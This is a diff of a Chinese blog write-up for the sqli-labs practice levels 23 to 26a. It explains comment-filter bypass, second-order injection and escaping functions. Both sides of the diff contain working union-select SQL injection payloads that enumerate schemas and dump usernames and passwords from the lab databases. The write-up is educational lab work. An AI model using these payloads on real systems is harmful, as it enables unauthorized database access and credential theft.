@@ -34,13 +34,13 @@
   <!-- 页面元数据 -->
   <title>sqli-labs-23-26a - Dr4x3zz</title>
   <meta name="keywords" content="sqli-labs,null">
-  <meta desc name="description" content="sqli-labs-23-26a - Dr4x3zz - Dr4x3zz">
+  <meta desc name="description" content="# sqli-labs-23-26a - Dr4x3zz - Dr4x3zz">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs-23-26a">
 <meta property="og:url" content="https://chenzhengkai10.github.io/2023/01/10/sqli-labs-23-26a/index.html">
 <meta property="og:site_name" content="Dr4x3zz">
-<meta property="og:description" content="sqli-labs-23-26a">
+<meta property="og:description" content="# sqli-labs-23-26a">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-01-10T06:19:13.000Z">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903825782),
+    lastupdate: new Date(1728904039860),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,94 +2585,88 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="sqli-labs-23-26a"><a href="#sqli-labs-23-26a" class="headerlink" title="sqli-labs-23-26a"></a>sqli-labs-23-26a</h1><span id="more"></span>
-
-<h2 id="sqli-labs-23"><a href="#sqli-labs-23" class="headerlink" title="sqli-labs-23"></a>sqli-labs-23</h2><p>在查看源代码时遇到一个函数记录一下先</p>
-<p><strong>preg_replace() 函数</strong></p>
+    <h1 id="sqli-labs-23-26a"><a class="markdownIt-Anchor" href="#sqli-labs-23-26a">#</a> sqli-labs-23-26a</h1>
+<span id="more"></span>
+<h2 id="sqli-labs-23"><a class="markdownIt-Anchor" href="#sqli-labs-23">#</a> sqli-labs-23</h2>
+<p>在查看源代码时遇到一个函数记录一下先</p>
+<p><strong>preg_replace () 函数</strong></p>
 <p>语法</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
-
 <p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
 <p>参数说明：</p>
 <ul>
 <li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
 <li>$replacement: 用于替换的字符串或字符串数组。</li>
 <li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
-<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
+<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是 - 1（无限制）。</li>
 <li>$count: 可选，为替换执行的次数。</li>
 </ul>
 <p>返回值</p>
-<p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p>
+<p>如果 subject 是一个数组， preg_replace () 返回一个数组， 其他情况下返回一个字符串。</p>
 <p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p>
 <p>简而言之，</p>
-<p>preg_replace(要替换的东西，替换成啥东西，哪个里面的东西需要替换);</p>
+<p>preg_replace (要替换的东西，替换成啥东西，哪个里面的东西需要替换);</p>
 <p>回归正题，</p>
-<p>先输入正确的id</p>
+<p>先输入正确的 id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
-
 <p>页面显示正常，加上单引号尝试一下</p>
 <p>页面报错</p>
 <blockquote>
-<p>  You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 </p>
+<p>You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_142839.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_142839.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_142839.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_142839.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>本题为单引号闭合，添加注释符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 --+</span><br><span class="line">url?id=1 #</span><br><span class="line">url?id=1 -- s</span><br></pre></td></tr></table></figure>
-
 <p>都不能起到注释作用，页面仍然显示报错</p>
 <p>查看源代码</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144040.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144040.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>将参数#和–替换成无</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144040.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144040.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>将参数 #和–替换成无</p>
 <p>导致我们的注释符失效</p>
 <p>所以要考虑绕过注释符了</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144240.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144240.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144240.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_144240.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <blockquote>
-<p>这里补充一个知识点吧，and 1&#x3D;1代表永恒为真， and 1&#x3D;2 代表永恒为假 我们判断有没有注入的时候可以利用这点来判断，如果页面不一样，就代表我们的语句生效了，存在注入点!and 1&#x3D;1 和and1&#x3D;2 得到的结果是不一致，说明我们的语句可以被注入使用,也即存在注入点</p>
+<p>这里补充一个知识点吧，and 1=1 代表永恒为真， and 1=2 代表永恒为假 我们判断有没有注入的时候可以利用这点来判断，如果页面不一样，就代表我们的语句生效了，存在注入点！and 1=1 和 and1=2 得到的结果是不一致，说明我们的语句可以被注入使用，也即存在注入点</p>
 </blockquote>
-<p>用order by尝试判断字段数，我试了几次页面都是报错</p>
+<p>用 order by 尝试判断字段数，我试了几次页面都是报错</p>
 <p>order by 后面加数字，加字段名都是可以的，但是字段名是不可以带引号的，意思是让这个列排序，但是因为单引号闭合后里面的数字变成字符串了这就产生了语法错误。</p>
-<p>所以这里直接用union select来判断字段数和回显点</p>
+<p>所以这里直接用 union select 来判断字段数和回显点</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 union select 1&#x27; </span><br><span class="line">?id=1&#x27; and 1=2 union select 1,2&#x27;</span><br><span class="line">?id=1&#x27; and 1=2 union select 1,2,3&#x27; </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195458.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195458.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195527.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>1和1,2都报错，3正常并且回显点2，3</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195458.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195458.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195527.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195527.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>1 和 1,2 都报错，3 正常并且回显点 2，3</p>
 <p>所以获取当前数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=2 union select 1,2,(select database())&#x27; </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195638.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195638.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195638.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_195638.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//获取服务器所有数据库名称</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(schema_name) from information_schema.schemata)&#x27; </span><br><span class="line">//获取当前数据库的所有表名</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)&#x27; </span><br><span class="line">//获取users表中的所有列名</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)&#x27; </span><br><span class="line">//获取users表中所有username和password</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(username,&#x27;^&#x27;,password) from users)&#x27; </span><br><span class="line">//我这里还有别的靶场，也可以查询别的靶场的数据，由第一个查询所有数据库名称，我可以知道我还有dvwa数据库，获取dvwa所有表名</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)&#x27; </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213123.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213123.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>可以看到由两个表，一个是guestbook，另一个是users</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213123.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213123.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>可以看到由两个表，一个是 guestbook，另一个是 users</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取dvwa中users的所有列名</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;)&#x27; </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213355.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213355.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>可以看到列名为avatar,failed_login,first_name,last_login,last_name,password,user,user_id</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213355.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213355.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>可以看到列名为 avatar,failed_login,first_name,last_login,last_name,password,user,user_id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取user和password的所有数据</span><br><span class="line">url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(user,&#x27;^&#x27;,password) from dvwa.users)&#x27; </span><br></pre></td></tr></table></figure>
-
-<p>查询结果就不放出来了，强调一点<strong>查询其他数据库的表中的内容要在表名前加上数据库名称，就那这个来说吧，我本意是查询dvwa的pass和password，但是如果在users前不加上dvwa，他就会查询当前数据库，但是当前数据库没有列名为user的数据，页面就会报错</strong></p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213814.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213814.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>ok，23关就到这里</p>
-<h2 id="sqli-labs-24"><a href="#sqli-labs-24" class="headerlink" title="sqli-labs-24"></a>sqli-labs-24</h2><p>24关已进入界面，和从前做过的大不一样，学习的内容是二次注入</p>
-<p><strong>SQL注入一般分为两类：一阶SQL注入（普通SQL注入），二阶SQL注入</strong></p>
-<p><strong>什么是二阶注入</strong>：<br>1.构造带有注入语句的危险payload1数据，在http请求中提交到服务器当中，该数据会被服务器存储到数据库当中<br>2.当我们要修改该payload1数据的时候，程序在检索存储payload1的数据库的时候将会造成SQL注入，如果攻击成功，在第二次响应中返回结果<br>3.也称为存储型注入，将可能造成sql注入的语句存储到数据库中，当再次调用该数据的时候，就可能发生SQL注入。</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214046.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214046.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>查询结果就不放出来了，强调一点<strong>查询其他数据库的表中的内容要在表名前加上数据库名称，就那这个来说吧，我本意是查询 dvwa 的 pass 和 password，但是如果在 users 前不加上 dvwa，他就会查询当前数据库，但是当前数据库没有列名为 user 的数据，页面就会报错</strong></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213814.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_213814.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>ok，23 关就到这里</p>
+<h2 id="sqli-labs-24"><a class="markdownIt-Anchor" href="#sqli-labs-24">#</a> sqli-labs-24</h2>
+<p>24 关已进入界面，和从前做过的大不一样，学习的内容是二次注入</p>
+<p><strong>SQL 注入一般分为两类：一阶 SQL 注入（普通 SQL 注入），二阶 SQL 注入</strong></p>
+<p><strong>什么是二阶注入</strong>：<br>
+1. 构造带有注入语句的危险 payload1 数据，在 http 请求中提交到服务器当中，该数据会被服务器存储到数据库当中<br>
+ 2. 当我们要修改该 payload1 数据的时候，程序在检索存储 payload1 的数据库的时候将会造成 SQL 注入，如果攻击成功，在第二次响应中返回结果<br>
+ 3. 也称为存储型注入，将可能造成 sql 注入的语句存储到数据库中，当再次调用该数据的时候，就可能发生 SQL 注入。</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214046.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214046.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>有一个忘记密码和新用户注册</p>
 <p>点击忘记密码</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214158.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214158.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214158.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230110_214158.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>让人哭笑不得啊</p>
-<p>用正确的username和pass</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_194726.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_194726.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>用正确的 username 和 pass</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_194726.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_194726.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>下面由三个位置，当前密码、新密码、重新输入密码</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200033.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200033.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_195511.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_195511.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p><strong>mysqli_real_escape_string()函数</strong></p>
-<p>mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200033.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200033.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_195511.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_195511.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><strong>mysqli_real_escape_string () 函数</strong></p>
+<p>mysqli_real_escape_string () 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure>
-
-
-
 <table>
 <thead>
 <tr>
@@ -2680,15 +2674,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><em>connection</em></td>
 <td>必需。规定要使用的 MySQL 连接。</td>
 </tr>
 <tr>
 <td><em>escapestring</em></td>
-<td>必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</td>
+<td>必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、&quot; 和 Control-Z。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>可使用本函数来预防数据库攻击。</p>
 <p>下列字符受影响：</p>
 <ul>
@@ -2696,160 +2692,151 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li>\n</li>
 <li>\r</li>
 <li>\</li>
-<li>‘</li>
-<li>“</li>
+<li>’</li>
+<li>&quot;</li>
 <li>\x1a</li>
 </ul>
 <p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
-<p>*mysql_real_escape_string()*函数转义 SQL 语句中使用的字符串中的特殊字符，这里select语句中用户名和密码都有单引号闭合，用户输入用这个函数处理之后无法闭合单引号，因此无注入点。</p>
+<p>*mysql_real_escape_string ()* 函数转义 SQL 语句中使用的字符串中的特殊字符，这里 select 语句中用户名和密码都有单引号闭合，用户输入用这个函数处理之后无法闭合单引号，因此无注入点。</p>
 <p><strong>无注入点具体原因和例子可以看：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp</a></strong></p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200221.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200221.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200221.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_200221.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p><strong>insert()</strong></p>
-<p>sql insert语句的写法：1、“insert into 表名 values (值1,值2…);”，将指定的数据插入到现成的表中；2、“Insert into 表名1 select * from 表名2;”，将另外表中数据查出来并插入到现成的表中。</p>
-<p>由于函数mysqli_real_escape_string()，所以在登录和注册都没有注入点，在查看修改密码的源代码</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201852.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201852.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>sql insert 语句的写法：1、“insert into 表名 values (值 1, 值 2…);”，将指定的数据插入到现成的表中；2、“Insert into 表名 1 select * from 表名 2;”，将另外表中数据查出来并插入到现成的表中。</p>
+<p>由于函数 mysqli_real_escape_string ()，所以在登录和注册都没有注入点，在查看修改密码的源代码</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201852.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201852.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>还是找不到注入点，但是往下一看</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201951.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201951.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201951.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_201951.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
